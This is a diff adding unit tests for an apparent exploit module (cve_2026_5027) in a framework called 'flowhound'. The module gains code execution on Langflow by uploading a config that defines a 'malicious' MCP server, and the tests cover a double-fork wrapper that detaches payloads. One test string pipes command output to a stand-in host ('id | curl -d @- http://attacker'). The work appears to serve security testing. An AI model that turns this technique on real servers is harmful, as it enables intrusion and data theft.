@@ -86,6 +86,44 @@ class TestUploadFile:
             )
         assert result == {"path": "/uploads/file.json"}
 
+    def test_args_included_in_json_when_provided(self):
+        exploit = Exploit()
+        with patch(
+            "flowhound.vulnerabilities.exploits.cve_2026_5027.post",
+            return_value=_mock_resp(200, {"path": "/uploads/file.json"}),
+        ) as mock_post:
+            exploit.upload_file(
+                auth=_AUTH_HEADERS,
+                url=_BASE_URL,
+                uuid="uuid-1",
+                command="bash",
+                args=["-c", "id"],
+            )
+        import json as _json
+
+        file_content = mock_post.call_args.kwargs["files"]["file"][1]
+        parsed = _json.loads(file_content)
+        assert parsed["mcpServers"]["malicious"]["args"] == ["-c", "id"]
+
+    def test_args_omitted_from_json_when_empty(self):
+        exploit = Exploit()
+        with patch(
+            "flowhound.vulnerabilities.exploits.cve_2026_5027.post",
+            return_value=_mock_resp(200, {"path": "/uploads/file.json"}),
+        ) as mock_post:
+            exploit.upload_file(
+                auth=_AUTH_HEADERS,
+                url=_BASE_URL,
+                uuid="uuid-1",
+                command="id",
+                args=[],
+            )
+        import json as _json
+
+        file_content = mock_post.call_args.kwargs["files"]["file"][1]
+        parsed = _json.loads(file_content)
+        assert "args" not in parsed["mcpServers"]["malicious"]
+
     def test_network_error_returns_none(self):
         exploit = Exploit()
         with patch(
@@ -129,6 +167,110 @@ class TestTriggerVuln:
             side_effect=ConnectionError("refused"),
         ):
             assert exploit.trigger_vuln(base_url=_BASE_URL, auth=_AUTH_HEADERS) is None
+
+
+# ---------------------------------------------------------------------------
+# exploit
+# ---------------------------------------------------------------------------
+
+
+# ---------------------------------------------------------------------------
+# _double_fork_wrap
+# ---------------------------------------------------------------------------
+
+
+class TestDoubleForkWrap:
+    def test_output_contains_fork(self):
+        result = Exploit._double_fork_wrap("pass")
+        assert "_os.fork()" in result
+
+    def test_output_contains_setsid(self):
+        result = Exploit._double_fork_wrap("pass")
+        assert "_os.setsid()" in result
+
+    def test_payload_indented_inside_grandchild_block(self):
+        result = Exploit._double_fork_wrap("import socket")
+        # Payload line must appear indented inside the grandchild if-block
+        assert "        import socket" in result
+
+    def test_child_exits_with_os_exit(self):
+        result = Exploit._double_fork_wrap("pass")
+        assert "_os._exit(0)" in result
+
+    def test_parent_waits_for_child(self):
+        result = Exploit._double_fork_wrap("pass")
+        assert "_os.waitpid(_pid, 0)" in result
+
+    def test_multiline_payload_all_indented(self):
+        code = "import os\nos.system('id')"
+        result = Exploit._double_fork_wrap(code)
+        assert "        import os\n" in result
+        assert "        os.system('id')\n" in result
+
+
+# ---------------------------------------------------------------------------
+# _needs_shell_wrap
+# ---------------------------------------------------------------------------
+
+
+class TestNeedsShellWrap:
+    def test_redirect_detected(self):
+        assert Exploit._needs_shell_wrap("echo 'pwned' > pwned.txt") is True
+
+    def test_append_redirect_detected(self):
+        assert Exploit._needs_shell_wrap("echo hi >> out.txt") is True
+
+    def test_pipe_detected(self):
+        assert Exploit._needs_shell_wrap("id | curl -d @- http://attacker") is True
+
+    def test_semicolon_detected(self):
+        assert Exploit._needs_shell_wrap("id; whoami") is True
+
+    def test_ampersand_detected(self):
+        assert Exploit._needs_shell_wrap("sleep 10 &") is True
+
+    def test_plain_command_not_wrapped(self):
+        assert Exploit._needs_shell_wrap("id") is False
+
+    def test_command_with_safe_args_not_wrapped(self):
+        assert Exploit._needs_shell_wrap("curl -s http://localhost/pwned") is False
+
+
+# ---------------------------------------------------------------------------
+# _parse_command
+# ---------------------------------------------------------------------------
+
+
+class TestParseCommand:
+    def test_simple_command_no_args(self):
+        cmd, args = Exploit._parse_command("id")
+        assert cmd == "id"
+        assert args == []
+
+    def test_command_with_args(self):
+        cmd, args = Exploit._parse_command("bash -c 'id'")
+        assert cmd == "bash"
+        assert args == ["-c", "id"]
+
+    def test_python_dash_c_with_code(self):
+        code = "import os; os.system('id')"
+        shell_command = f"python3 -c {code!r}"
+        cmd, args = Exploit._parse_command(shell_command)
+        assert cmd == "python3"
+        assert args == ["-c", code]
+
+    def test_empty_string_returns_original(self):
+        cmd, args = Exploit._parse_command("")
+        assert cmd == ""
+        assert args == []
+
+    def test_multiword_no_quotes(self):
+        cmd, args = Exploit._parse_command("curl -s http://localhost")
+        assert cmd == "curl"
+        assert args == ["-s", "http://localhost"]
+
+    def test_unmatched_quote_returns_none(self):
+        assert Exploit._parse_command("echo 'unterminated") is None
 
 
 # ---------------------------------------------------------------------------
@@ -228,8 +370,14 @@ class TestExploit:
                 is True
             )
 
-    def test_uses_custom_payload(self):
-        payload = MagicMock()
+    def test_uses_non_bash_payload(self):
+        """Payloads with raw_command=None use python3 -c + double-fork wrapping."""
+        from flowhound.vulnerabilities.payloads.base_payload_class import (
+            PayloadBaseClass,
+        )
+
+        payload = MagicMock(spec=PayloadBaseClass)
+        payload.raw_command = None  # not a raw-command payload
         payload.load_payload.return_value = "import os; os.system('id')"
         exploit = Exploit()
         with (
@@ -244,7 +392,7 @@ class TestExploit:
             patch(
                 "flowhound.vulnerabilities.exploits.cve_2026_5027.post",
                 return_value=_mock_resp(200, {"path": "file.json"}),
-            ),
+            ) as mock_post,
         ):
             assert (
                 exploit.exploit(
@@ -256,3 +404,89 @@ class TestExploit:
                 is True
             )
         payload.load_payload.assert_called_once()
+        file_content = mock_post.call_args.kwargs["files"]["file"][1]
+        import json as _json
+
+        parsed = _json.loads(file_content)
+        server = parsed["mcpServers"]["malicious"]
+        assert server["command"] == "python3"
+        assert server["args"][0] == "-c"
+        # Double-fork boilerplate must be present in the code argument
+        code_arg = server["args"][1]
+        assert "_os.fork()" in code_arg
+        assert "_os.setsid()" in code_arg
+        # Single quotes inside payload code must survive intact (not shell-escaped)
+        assert "import os; os.system('id')" in code_arg
+
+    def test_execute_bash_command_plain_uses_raw(self):
+        """execute_bash_command payload with no metacharacters: command used directly."""
+        from flowhound.vulnerabilities.payloads.execute_bash_command import (
+            Payload as BashPayload,
+        )
+
+        payload = BashPayload(cmd="id")
+        exploit = Exploit()
+        with (
+            patch(
+                "flowhound.vulnerabilities.clients.langflow.post",
+                return_value=_mock_auth_post(),
+            ),
+            patch(
+                "flowhound.vulnerabilities.exploits.cve_2026_5027.get",
+                side_effect=[_mock_resp(200, {"id": "uid-123"}), _mock_resp(200)],
+            ),
+            patch(
+                "flowhound.vulnerabilities.exploits.cve_2026_5027.post",
+                return_value=_mock_resp(200, {"path": "file.json"}),
+            ) as mock_post,
+        ):
+            exploit.exploit(
+                base_url=_BASE_URL,
+                username="admin",
+                password="secret",
+                payload=payload,
+            )
+        import json as _json
+
+        file_content = mock_post.call_args.kwargs["files"]["file"][1]
+        parsed = _json.loads(file_content)
+        assert parsed["mcpServers"]["malicious"]["command"] == "id"
+        assert "args" not in parsed["mcpServers"]["malicious"]
+
+    def test_execute_bash_command_with_redirect_uses_bash_wrap(self):
+        """execute_bash_command payload with redirect: wrapped in bash -c."""
+        from flowhound.vulnerabilities.payloads.execute_bash_command import (
+            Payload as BashPayload,
+        )
+
+        payload = BashPayload(cmd="echo 'pwned' > pwned.txt")
+        exploit = Exploit()
+        with (
+            patch(
+                "flowhound.vulnerabilities.clients.langflow.post",
+                return_value=_mock_auth_post(),
+            ),
+            patch(
+                "flowhound.vulnerabilities.exploits.cve_2026_5027.get",
+                side_effect=[_mock_resp(200, {"id": "uid-123"}), _mock_resp(200)],
+            ),
+            patch(
+                "flowhound.vulnerabilities.exploits.cve_2026_5027.post",
+                return_value=_mock_resp(200, {"path": "file.json"}),
+            ) as mock_post,
+        ):
+            exploit.exploit(
+                base_url=_BASE_URL,
+                username="admin",
+                password="secret",
+                payload=payload,
+            )
+        import json as _json
+
+        file_content = mock_post.call_args.kwargs["files"]["file"][1]
+        parsed = _json.loads(file_content)
+        assert parsed["mcpServers"]["malicious"]["command"] == "bash"
+        assert parsed["mcpServers"]["malicious"]["args"] == [
+            "-c",
+            "echo 'pwned' > pwned.txt",
+        ]
